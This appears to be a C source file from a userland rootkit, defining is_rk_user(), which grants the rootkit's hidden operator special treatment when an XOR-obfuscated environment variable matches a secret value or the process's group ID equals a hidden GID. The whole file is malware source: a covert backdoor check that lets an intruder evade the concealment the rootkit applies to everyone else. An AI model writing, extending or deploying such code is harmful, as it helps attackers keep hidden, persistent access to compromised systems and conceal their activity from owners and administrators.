#include "../rkconsts.h"

int is_rk_user(void) {
    // Checks if user is the rootkit user
    int rk = 0;
    #ifdef ENV_AUTH
        char *env_var = strdup(ENV_VAR_NAME); xor(env_var);
        char *env_var_val = strdup(ENV_VAR_VAL); xor(env_var_val);
        if (strcmp(getenv(env_var), env_var_val) == 0) {
            DEBUG_MSG("[-] Passed env check\n");
            rk = 1;
        }
        else {
            DEBUG_MSG("[-] Failed env check\n");
            rk = 0;
        }
    #endif
    #ifdef GID_AUTH
        int gid = syscall(104);
        if (gid == HIDDEN_GID) {
            rk = 1;
            DEBUG_MSG("[-] Passsed GID check\n");
        }
        else {
            rk = 0;
        }
    #endif
    if (rk) {
        DEBUG_MSG("[-] Hello user!\n");
    }
    else {
        DEBUG_MSG("[!] Access denied\n");
    }
    return rk;
}